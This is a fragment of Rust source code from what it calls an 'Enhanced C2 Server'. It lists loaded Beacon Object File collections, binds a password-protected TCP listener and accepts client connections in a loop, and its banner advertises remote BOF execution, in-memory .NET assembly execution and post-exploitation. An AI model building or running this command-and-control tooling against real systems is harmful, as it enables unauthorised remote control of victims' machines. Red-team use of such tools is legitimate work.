        for (collection_name, bofs) in &collections {
            println!("  • {}: {} BOFs", collection_name, bofs.len());
        }
        
        println!("{}", "=".repeat(60));
    }

    // Set up TCP listener
    let addr = format!("{}:{}", args.ip_address, args.port).parse::<SocketAddr>()?;
    let listener = TcpListener::bind(&addr).await?;

    println!("🌐 Server Details:");
    println!("📡 Listening on: {}", addr);
    println!("🔑 Password: {}", args.password);
    println!("🔥 BOF Support: Enabled");
    println!("📚 BOF Directory: ./bofs/");
    println!("📋 Callback System: Ready for command results");
    println!("");
    println!("✅ Enhanced C2 Server ready for client connections!");
    println!("🎯 Supported Operations:");
    println!("  • Traditional C2 operations (listeners, agents, commands)");
    println!("  • BOF execution (local and remote)");
    println!("  • InlineExecute-Assembly (.NET assemblies)");
    println!("  • Real-time task management");
    println!("  • Advanced reconnaissance and post-exploitation");

    // Accept connections loop
    loop {
        match listener.accept().await {
            Ok((stream, addr)) => {
                let state_clone = Arc::clone(&state);
                tokio::spawn(async move {
                    handle_client(stream, addr, state_clone).await;
                });
            }
            Err(e) => {
                error!("❌ Error accepting connection: {}", e);
            }
        }
    }
}